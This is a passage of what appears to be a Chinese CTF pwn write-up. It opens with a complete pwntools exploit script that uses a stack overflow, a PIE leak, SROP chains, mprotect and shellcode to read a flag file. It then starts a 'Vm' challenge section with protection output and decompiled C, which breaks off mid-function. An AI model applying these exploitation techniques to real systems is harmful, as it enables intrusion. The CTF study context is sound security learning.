+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = elf = ELF(<span class="string">&#x27;./xxxxx&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">scc = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    lea rsi, [rip]</span></span><br><span class="line"><span class="string">    add rsi, 0x3a</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    xor rcx, rcx</span></span><br><span class="line"><span class="string">    mov rdi, 0xffffff9c</span></span><br><span class="line"><span class="string">    mov rax, 0x101</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">               </span></span><br><span class="line"><span class="string">    mov rsi, rax</span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    mov r10, 0x50</span></span><br><span class="line"><span class="string">    mov rax, 40</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">               &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sc = <span class="string">&#x27;&#x27;&#x27;brva 0x16A3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">io = process(elf.path)</span><br><span class="line"><span class="comment"># gdb.attach(io, sc)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span></span><br><span class="line">payload += <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p8(<span class="number">0x5F</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;magic number:&#x27;</span>)</span><br><span class="line">n_main = <span class="built_in">int</span>(io.recvline().strip())</span><br><span class="line">log.success(<span class="string">&#x27;n_main: &#x27;</span> + <span class="built_in">hex</span>(n_main))</span><br><span class="line">x = n_main//<span class="number">4</span></span><br><span class="line">log.success(<span class="string">&#x27;n_main: &#x27;</span> + <span class="built_in">hex</span>(x))</span><br><span class="line">y = n_main//<span class="number">3</span></span><br><span class="line">log.success(<span class="string">&#x27;n_main: &#x27;</span> + <span class="built_in">hex</span>(y))</span><br><span class="line">main_addr = y <span class="keyword">if</span> y &amp; <span class="number">0xfff</span> == <span class="number">0x6B0</span> <span class="keyword">else</span> x</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;main_addr: &#x27;</span> + <span class="built_in">hex</span>(main_addr))</span><br><span class="line"></span><br><span class="line">pie = main_addr - <span class="number">0x16B0</span></span><br><span class="line">log.success(<span class="string">&#x27;pie: &#x27;</span> + <span class="built_in">hex</span>(pie))</span><br><span class="line"></span><br><span class="line">syscall_pop_ret = pie + <span class="number">0x134F</span></span><br><span class="line">cls_rax_pop_ret = pie + <span class="number">0x16CC</span></span><br><span class="line">ret = pie + <span class="number">0x16D5</span></span><br><span class="line"></span><br><span class="line">s = SigreturnFrame()</span><br><span class="line">s.rdi = <span class="number">0</span></span><br><span class="line">s.rsi = pie + <span class="number">0x4800</span></span><br><span class="line">s.rdx = <span class="number">0x300</span></span><br><span class="line">s.rsp = pie + <span class="number">0x4800</span></span><br><span class="line">s.rip = syscall_pop_ret</span><br><span class="line">s.rax = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span></span><br><span class="line">payload += p64(cls_rax_pop_ret)</span><br><span class="line">payload += p64(<span class="number">0x3C</span>)</span><br><span class="line">payload += p64(syscall_pop_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_pop_ret)</span><br><span class="line">payload += <span class="built_in">bytes</span>(s)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe</span>)</span><br><span class="line"></span><br><span class="line">s1 = SigreturnFrame()</span><br><span class="line">s1.rdi = pie</span><br><span class="line">s1.rsi = <span class="number">0x7000</span></span><br><span class="line">s1.rdx = <span class="number">7</span></span><br><span class="line">s1.rsp = pie + <span class="number">0x4950</span></span><br><span class="line">s1.rip = syscall_pop_ret</span><br><span class="line">s1.rax = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line">payload += p64(cls_rax_pop_ret)</span><br><span class="line">payload += p64(<span class="number">0x3C</span>)</span><br><span class="line">payload += p64(syscall_pop_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_pop_ret)</span><br><span class="line">payload += <span class="built_in">bytes</span>(s1)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(cls_rax_pop_ret)</span><br><span class="line">payload += p64(<span class="number">0x3C</span>)</span><br><span class="line">payload += p64(syscall_pop_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pie + <span class="number">0x4800</span>)</span><br><span class="line">payload += p64(pie + <span class="number">0x4960</span>)</span><br><span class="line">payload += scc</span><br><span class="line">payload += <span class="string">b&#x27;/flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">io.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Vm"><a href="#Vm" class="headerlink" title="Vm"></a>Vm</h2><h3 id="保护-2"><a href="#保护-2" class="headerlink" title="保护"></a>保护</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Arch:       amd64-64-little</span><br><span class="line">RELRO:      Partial RELRO</span><br><span class="line">Stack:      No canary found</span><br><span class="line">NX:         NX enabled</span><br><span class="line">PIE:        No PIE (0x400000)</span><br><span class="line">SHSTK:      Enabled</span><br><span class="line">IBT:        Enabled</span><br></pre></td></tr></table></figure></div>
+<p>保护最少的一集</p>
+<h3 id="沙箱-2"><a href="#沙箱-2" class="headerlink" title="沙箱"></a>沙箱</h3><p>无</p>
+<h3 id="逆向分析-2"><a href="#逆向分析-2" class="headerlink" title="逆向分析"></a>逆向分析</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  vm *vm; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  vm = <span class="built_in">malloc</span>(<span class="number">0x50u</span>LL);</span><br><span class="line">  <span class="built_in">memset</span>(vm, <span class="number">0</span>, <span class="keyword">sizeof</span>(vm));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your opcodes:&quot;</span>);</span><br><span class="line">  vm-&gt;code = &amp;buf;</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x800u</span>LL);</span><br><span class="line">  vm-&gt;ip = <span class="number">0</span>;</span><br><span class="line">  vm-&gt;x = <span class="number">0x1000L</span>L;</span><br><span class="line">  run(vm);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">run</span><span class="params">(vm *vm)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> c; <span class="comment">// eax</span></span><br><span class="line">  x *s; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  s = <span class="built_in">malloc</span>(<span class="number">0xCu</span>LL);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( getoptype(vm, s) == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    c = s-&gt;t &amp; <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> ( c == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      op3(vm, s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( (s-&gt;t &amp; <span class="number">3u</span>) &lt;= <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( c == <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        op2(vm, s);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( (s-&gt;t &amp; <span class="number">3</span>) != <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        op1(vm, s);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        op0(vm, s);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(x));</span><br><span class="line">    <span class="keyword">if</span> ( vm-&gt;x &gt; <span class="number">4096</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( vm-&gt;ip &lt;= <span class="number">0x800u</span> );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Segment error&quot;</span>);</span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">getoptype</span><span class="params">(vm *vm, x *s)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *code; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> ip; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> type; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *v7; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *v10; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *v12; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *code3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> ip3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v17; <span class="comment">// [rsp+17h] [rbp-9h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  code = vm-&gt;code;</span><br><span class="line">  ip = vm-&gt;ip;</span><br><span class="line">  vm-&gt;ip = ip + <span class="number">1</span>;</span><br><span class="line">  s-&gt;t = code[ip];</span><br><span class="line">  s-&gt;type = s-&gt;t &amp; <span class="number">3</span>;</span><br><span class="line">  type = s-&gt;type;</span><br><span class="line">  <span class="keyword">if</span> ( type == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    code3 = vm-&gt;code;</span><br><span class="line">    ip3 = vm-&gt;ip;</span><br><span class="line">    vm-&gt;ip = ip3 + <span class="number">1</span>;</span><br><span class="line">    s-&gt;codeval = code3[ip3];</span><br><span class="line">    <span class="keyword">if</span> ( g6(s-&gt;codeval) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFFL</span>L;</span><br><span class="line">    s-&gt;codeval2 = *&amp;vm-&gt;code[vm-&gt;ip];</span><br><span class="line">    vm-&gt;ip += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( s-&gt;type &lt;= <span class="number">3u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( type == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = vm-&gt;code;</span><br><span class="line">      v11 = vm-&gt;ip;</span><br><span class="line">      vm-&gt;ip = v11 + <span class="number">1</span>;</span><br><span class="line">      s-&gt;codeval = v10[v11];</span><br><span class="line">      v12 = vm-&gt;code;</span><br><span class="line">      v13 = vm-&gt;ip;</span><br><span class="line">      vm-&gt;ip = v13 + <span class="number">1</span>;</span><br><span class="line">      s-&gt;codeval2 = v12[v13];</span><br><span class="line">      <span class="keyword">if</span> ( g6(s-&gt;codeval) &amp;&amp; g6(s-&gt;codeval2) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0xFFFFFFFFL</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( s-&gt;type )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = vm-&gt;code;</span><br><span class="line">      v8 = vm-&gt;ip;</span><br><span class="line">      vm-&gt;ip = v8 + <span class="number">1</span>;</span><br><span class="line">      v17 = v7[v8];</span><br><span class="line">      <span class="keyword">if</span> ( g6(v17) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0xFFFFFFFFL</span>L;</span><br><span class="line">      s-&gt;codeval = v17;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        s-&gt;codeval &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">        v5 = vm-&gt;code;</span><br><span class="line">        v6 = vm-&gt;ip;</span><br><span class="line">        vm-&gt;ip = v6 + <span class="number">1</span>;</span><br><span class="line">        s-&gt;codeval |= v5[v6];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  result = s-&gt;t;</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFFL</span>L;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __fastcall <span class="title function_">op0</span><span class="params">(vm *vm, x *s)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> ( s-&gt;t 